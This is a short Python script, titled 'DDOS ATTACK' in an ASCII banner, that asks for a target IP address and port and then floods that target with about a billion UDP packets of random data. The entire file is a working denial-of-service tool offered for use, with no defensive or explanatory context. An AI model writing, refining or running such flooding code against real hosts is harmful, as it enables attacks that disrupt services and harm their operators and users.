import pyfiglet
import socket , random
log = pyfiglet.figlet_format('DDOS ATTACK')
GG = '----------------------------------------------------------'
wol = f'{GG}\n{log}{GG}'
print(wol)
HOSTNAME = input('ENTER THE HOSTNAME IP NOT URL: ')
PRT  = int(input('ENTER THE PORT : '))
print ("START :)")
ME = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
ME.connect((HOSTNAME , PRT))
for i in range(100*10000000):
    DATA = ME.send(random._urandom(10)*10000)
    print(f"SEND : {i}")
